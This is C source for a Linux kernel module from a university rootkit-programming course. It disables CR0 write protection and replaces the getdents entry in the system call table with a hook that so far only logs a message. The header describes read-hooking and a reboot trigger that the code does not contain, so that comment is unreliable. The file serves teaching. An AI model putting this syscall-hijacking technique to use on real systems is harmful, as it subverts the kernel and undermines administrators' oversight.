
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 3                                                             */
/*                                                                             */
/*   Filename: process_masker.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: This kernel module hooks the read system call and outputs the      */
/*          intercepted data when reading from stdin. Additionaly, when a      */
/*          magic command gets intercepted it performs a panic-less system     */
/*          reboot.                                                            */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>   /* Needed by all modules */
#include <linux/unistd.h>   /* Needed for __NR_getdents */
#include <linux/syscalls.h>   /* Needed for struct linux_dirent */
#include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */


MODULE_LICENSE("GPL");


void **sys_call_table;
asmlinkage int (*getdents_syscall_ref)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

/* Function that replaces the original getdents_syscall. In addition to what
   getdents_syscall does, it also  */
asmlinkage int my_getdents_syscall_ref(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int res;

	/* Call original getdents_syscall */
	res = getdents_syscall_ref(fd, dirp, count);

	printk(KERN_INFO "Mouaxaxaxaxaxa!");

	return res;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~0x00010000);
}


// TODO: what if it was disabled from the first place?
void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | 0x00010000);
}


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the getdents() syscall. */
static int __init process_masker_start(void)
{
	disable_write_protect_mode();

	/* Store original getdents() syscall */
	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	getdents_syscall_ref = (void *) sys_call_table[__NR_getdents];

	/* Replace in the system call table the original
	   getdents() syscall with our process masker function */
	sys_call_table[__NR_getdents] = (unsigned long *) my_getdents_syscall_ref;

	enable_write_protect_mode();

	printk(KERN_INFO "%s\n", "Rootkit inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
static void __exit process_masker_end(void)
{
	disable_write_protect_mode();

	/* Restore original getdents() syscall */
	sys_call_table[__NR_getdents] = (int *) getdents_syscall_ref;

	enable_write_protect_mode();

	printk(KERN_INFO "%s\n", "Rootkit removed");

	return;
}

module_init(process_masker_start);
module_exit(process_masker_end);
